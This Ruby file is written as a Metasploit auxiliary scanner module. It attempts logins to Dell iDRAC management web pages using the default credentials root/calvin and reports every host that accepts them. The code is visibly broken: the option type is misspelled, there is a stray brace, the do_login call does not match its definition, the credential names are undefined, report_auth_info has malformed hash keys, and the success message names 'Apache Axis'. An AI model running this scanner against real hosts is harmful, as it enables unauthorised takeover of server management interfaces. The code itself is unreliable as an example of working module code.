##
# $Id$
##
##
# This file is part of the Metasploit Framework and may be subject to redistribution and commercial restrictions. Please see the Metasploit web site for more information 
# on licensing and terms of use.
#   http://metasploit.com/
##
require 'msf/core' class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	def initialize
		super(
			'Name' => 'Dell iDRAC default login',
			'Version' => '$Revision$',
			'Description' => %q{This module attempts to login to a iDRAC webserver
				instance using default username and password},
			'Author' =>
				[
					'Cristiano Maruti <cmaruti@gmail.com>'
				],
			'References' =>
				[
					[ 'CVE', '1999-0502'] # Weak password
				],
			'License' => MSF_LICENSE
		)
		register_options(
			[ Opt::RPORT(443),
				OptString.new('URI', [false, 'Path to the iDRAC Administration page', '/data/login']),
				OptSting.new('USERNAME',['root', 'Username']),
				OptSting.new('PASSWORD',['calvin', 'Password']),
		], self.class)
	end
	def target_url
		"https://#{vhost}:#{rport}#{datastore['URI']}"
	end
	def run_host(ip)
		print_status("Verifying login exists at #{target_url}")
		begin
			res = send_request_cgi({
					'method' => 'POST',
					'uri' => datastore['URI']
				}, 20)
		rescue
			print_error("The iDRAC login page does not exist at #{target_url}")
			return
		end
		print_status "#{target_url} - Dell iDRAC - Attempting authentication"
		do_login(user, pass)
		}
	end
	def do_login
		post_data = "user=#{Rex::Text.uri_encode(USERNAME)}&password=#{Rex::Text.uri_encode(PASSWORD)}"
		begin
			res = send_request_cgi({
				'method' => 'POST',
				'uri' => datastore['URI'],
				'data' => post_data,
			}, 20)
			if (res and res.code == 200 and res.body.to_s.match(/<authResult>0<\/authResult>/) != nil)
				print_good("#{target_url} - Apache Axis - SUCCESSFUL login for '#{USERNAME}' : '#{PASSWORD}'")
				report_auth_info(
					:host => rhost, port => rport, sname => ('https'), user => USERNAME, pass => PASSWORD, proof => "WEBAPP=\"Apache Axis\", 
					:VHOST=#{vhost}", source_type => "user_supplied", duplicate_ok => true, active => true
				)
			elsif(res and res.code == 200)
				vprint_error("#{target_url} - Dell iDRAC - Failed to login as '#{USERNAME}'")
			else
				vprint_error("#{target_url} - Dell iDRAC - Unable to authenticate.")
				return :abort
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end
